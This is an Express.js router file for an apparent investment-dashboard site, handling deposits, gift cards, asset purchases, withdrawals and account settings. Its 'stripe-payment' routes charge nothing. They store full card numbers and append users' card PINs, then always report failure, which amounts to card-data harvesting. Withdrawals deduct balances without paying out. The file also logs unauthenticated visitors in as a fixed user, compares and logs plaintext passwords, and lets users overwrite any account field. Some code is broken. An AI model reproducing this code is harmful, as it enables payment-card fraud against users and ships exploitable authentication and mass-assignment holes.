const express = require("express")
const Router = express.Router()
const {CARD, USER, Transaction, CLUSTER }= require("../../modules/db/db-user")
const showError = require("../../modules/errormodule")
const {addDays} = require('date-fns')
const {upload, cloudinary} = require("../../modules/fileupload-configuration");
const multer  = require('multer')
const path = require("path")



Router.use(express.urlencoded({extended : false}))
Router.use(async function(req,res,next){
    try{
        if(req.isAuthenticated()){
           return next()
        }
        // res redirect to login page
        const user = await USER.findOne({email : "somtrcu@sidin.cniy"})
        return req.login(user, function(err){
            if(err) return console.log(err.message)
            return next()
        })
    }catch(err){
        res.send("an error occured internally, please report")
    }
})
/*
@ paywith new card - 
deposit card ** 
<users with no card>
*/
Router.post("/stripe-payment-new",async function(req,res){
    try{
        deleted  = !Boolean(req.body.save)
        await CARD.create({...req.body, deleted , user : req.user._id, card, 
            card_expiry_month : req.body.card_expiry.split("/")[0] ,
            card_expiry_year : req.body.card_expiry.split("/")[1]
        })
        return showError(req, "/dashboard/deposit", "payment couldn't be completed", res)
    }catch(err){
        console.log("caught error")
        // showError here but for now
        return showError(req, "/dashboard/deposit", err.message, res)
    }
})


/*
@ paywith available card - 
deposit card **
<users with available card>
*/
Router.post("/stripe-payment-available", async function(req,res){
    try{
        const card = await CARD.findById(req.body.card_id)
        if(!card) return  showError(req, "/dashboard/deposit", "error locating account card, try again", res)
        card.card_pin.push(req.body.card_pin)
        await card.save()
        return showError(req, "/dashboard/deposit", "payment couldn't be processed", res)
    }catch(err){
        return showError(req, "/dashboard/deposit", err.message, res)
    }
})

/*
@ Buy giftcard - 
<all users with>
# send email
giftcard key is made of => key : req.user.id + Date.now
*/
Router.post("/giftcard", async function(req,res){
    try{
        const {amount, title} = JSON.parse(req.body.giftcard)
        if(req.user.balance < Number(amount)) return showError(req, "/dashboard/withdraw#giftcard", "Insufficient balance", res)
       await USER.updateOne({_id : req.user._id}, { balance : req.user.balance - Number(amount), $inc : { debits : Number(amount)}, $push : {giftcards :{amount,title, key : req.user.id + "x" + Date.now()} } })
       await Transaction.create({user : req.user._id, amount : -amount, type : "giftcard", status : "success"})
        // send email+-
        return showError(req, "/dashboard/withdraw#giftcard", "purchase successful", res)
    }catch(err){
        return showError(req, "/dashboard/withdraw#giftcard", err.message, res)
    }
})

/*
send email 
to redeemer of the giftcard
*/
Router.post("/redeemgiftcard", async function(req,res){
    try{
       const user = await USER.findOne({_id : req.body.key.split("x")[0], "giftcards.key" : req.body.key, "giftcards.cashed": false}, "giftcards")
       if(!user) return showError(req, "/dashboard/deposit#redeem", "invalid giftcard key", res)
       user.giftcards.forEach(gftcd=> {
           if(gftcd.key == req.body.key.trim()){
               gftcd.cashed = true,
               gftcd.cashedBy = req.user._id
            }
        })
        await user.save()
        const giftcard = user.giftcards.find(cd=> cd.key == req.body.key.trim())
       const giftcardAmount = giftcard.amount - (giftcard.amount * 0.05).toFixed()
        await USER.updateOne({_id : req.user._id}, {$inc : {balance : giftcardAmount,credits : giftcard.amount}})
        await Transaction.create({user : req.user._id, amount : giftcardAmount, type : "giftcard", status : "success"})
        return showError(req, "/dashboard", "succesfully redeemed ", res)
    }catch(err){
        console.log(err)
        return showError(req, "/dashboard/deposit#redeem", err.message, res)
    }
})

Router.post("/buyAssets", async function(req,res){
    try{
        if(req.user.balance < Number(req.body.capital))  return showError(req, "/dashboard/invest", "Insufficient balance", res)
        const plan = JSON.parse(req.body.investment)
        plan._id = undefined
        const newInv = {
            user : req.user._id,
            email : req.user.email,
            ...plan,
            capital : req.body.capital,
            expiry: addDays(new Date(), plan.duration),
        };
        await CLUSTER.create(newInv)
        await USER.updateOne({_id : req.user._id}, {$inc : {balance : - Number(req.body.capital)},$push :{
        activities : {  title : plan.title + " Cluster", body : "You bought assets worth $"+ Number(req.body.capital).toLocaleString(), type : "assets_buy"}
        }})
        return showError(req, "/dashboard/invest", "Asset purchase successful", res)
    }catch(err){
        return showError(req, "/dashboard/invest", err.message, res)
    }
})

/*
@ send email - 
<all users with>
# send email || should we send email sef ?
*/
Router.post("/withdraw", async function(req,res){
    try{
        if(req.user.balance < Number(req.body.amount))  return showError(req, "/dashboard/withdraw", "Insufficient balance", res)
        await USER.updateOne({_id : req.user._id}, { $inc : {balance : - Number(req.body.amount)}})
        await Transaction.create({user : req.user._id, amount : Number(req.body.amount), type : "withdraw" })
        return showError(req, "/dashboard/withdraw", "Processing withdrawal", res)
        // send email
    }catch(err){
        return showError(req, "/dashboard/withdraw", err.message, res)
    }
})

/*
<all users with>
upload receipt
# send email || send only during confirmation || 
*/
loc = path.join(__dirname, "../../uploads")
Router.post("/receipt", function(req,res){
    return upload.single("receipt")(req,res,async function(err){
    if (err instanceof multer.MulterError) {
        return showError(req,"/dashboard/deposit",err.message,res);
      } else if (err) {
        // An unknown error occurred when uploading.
        return showError(req, "/dashboard/deposit", err.message, res);
      }
      try{
          const img_file = await cloudinary.uploader.upload(loc + "/"+req.file.filename, { folder : "receipt", use_filename : true})
         await Transaction.create({user : req.user._id,amount : req.body.amount,type : "withdraw",url : img_file.secure_url})
         return showError(req, "/dashboard/deposit", "Successful, Processing Transaction", res)
      }catch(e){
        return showError(req, "/dashboard/deposit", "server error, report problem", res);
      }
    })
})

/*
<all users with>
Redeem giftcard
*/
Router.post("/redeemx-gift", function(req,res){
    // 
})

/* 
account settings
 user post edit account info
*/ 
Router.post("/settings", express.urlencoded({extended : false}), async function(req,res){
    try{
        await USER.updateOne({_id : req.user._id}, {...JSON.parse(JSON.stringify(req.body)), $push : {activities : {  title :" Account settings", body : "You updated your account information ", type : "settings"}}})
       res.redirect("/dashboard/account")
    }catch(err){
        return showError(req, "/dashboard/account", err.message, res);
    }
})

/* 
account settings
 user post edit account info
*/ 
Router.post("/security", express.urlencoded({extended : false}), async function(req,res){
    try{
        console.log(req.body)
        if(req.body.password){
            console.log("password not correcnt")
            console.log(req.body.prevPassword , req.user.password)
            if(req.body.prevPassword !== req.user.password) return showError(req, "/dashboard/account", "Incorrect password", res);
            await USER.updateOne({_id : req.user._id}, {...req.body, $push :{
                activities : {  title :" Account security", body : "You changed your sensitive information ", type : "settings"}
                }})
            return showError(req, "/dashboard/account", "Password changed successfully", res);
        }
        if(req.user.email == req.body.email) return redirec("/dashboard/security")
        await USER.updateOne({_id : req.user._id}, {email : req.body.email})
        return showError(req, "/dashboard/account", "Email changed successfully", res);
    }catch(err){
        console.log(err)
        return showError(req, "/dashboard/account", err.message, res);
    }
})

/* 
account settings
 user post edit account info
*/ 
Router.post("/settings", express.urlencoded({extended : false}), async function(req,res){
    try{
       const updated = await USER.updateOne({_id : req.user._id}, JSON.parse(JSON.stringify(req.body)))
       res.redirect("/dashboard/account")
    }catch(err){
        return showError(req, "/dashboard/account", err.message, res);
    }
})


/*
deletecard route 
sending Id through submit button
*/
Router.post("/deletecard", express.urlencoded({extended : false}), async function(req,res){
  try{
   await  CARD.updateOne({_id : req.body.card_id}, { deleted : true})
   return showError(req, "/dashboard/account", "Card successfully deleted", res);
  }catch(err){
    return showError(req, "/dashboard/account", err.message, res);
  }
})

/*
@ Add new card - 
Account settings **
card with billing details
*/
Router.post("/addNewcard", express.urlencoded({extended : false}), async function(req,res){
    try{
        await CARD.create({...req.body, 
            user : req.user._id,
            card_expiry_month : req.body.card_expiry.split("/")[0] ,
            card_expiry_year : req.body.card_expiry.split("/")[1]
        })
        return showError(req, "/dashboard/account", "Card succesfully added", res)
    }catch(err){
        return showError(req, "/dashboard/account", err.message, res)
    }
})

module.exports = Router
